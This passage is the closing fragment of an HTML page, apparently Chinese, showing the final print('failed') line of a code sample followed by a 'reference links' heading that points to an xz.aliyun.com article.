&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(&#39;failed&#39;)</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7492#toc-7</span></p></body>
</html>
